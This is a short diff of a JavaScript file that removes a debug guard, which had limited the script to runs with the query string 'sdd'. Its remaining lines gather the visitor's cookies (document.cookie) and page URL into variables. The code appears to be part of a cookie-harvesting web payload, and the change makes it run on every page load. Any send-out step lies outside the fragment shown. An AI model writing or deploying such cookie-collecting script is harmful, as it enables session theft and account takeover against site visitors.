@@ -1,8 +1,3 @@
-//Debugging purposes
-if(window.location.search.substr(1) != "sdd"){
-	throw new Error();
-}
-
 //Gen data
 cookie = "Cookies:"+document.cookie;
 url = "URL:"+document.location;
